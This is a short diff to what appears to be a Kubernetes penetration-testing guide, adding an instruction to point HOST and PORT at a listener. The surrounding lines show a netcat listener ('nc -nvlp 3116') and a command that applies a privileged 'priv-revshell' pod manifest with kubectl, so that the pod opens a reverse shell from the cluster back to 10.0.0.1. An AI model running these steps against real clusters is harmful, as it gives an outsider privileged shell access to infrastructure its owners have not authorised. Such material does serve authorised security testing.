@@ -68,7 +68,8 @@ nc -nvlp 3116
 
 **Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
 
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace HOST and PORT values to point to listener
 
 ```bash
 HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/priv/[RESOURCE_TYPE]/priv-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
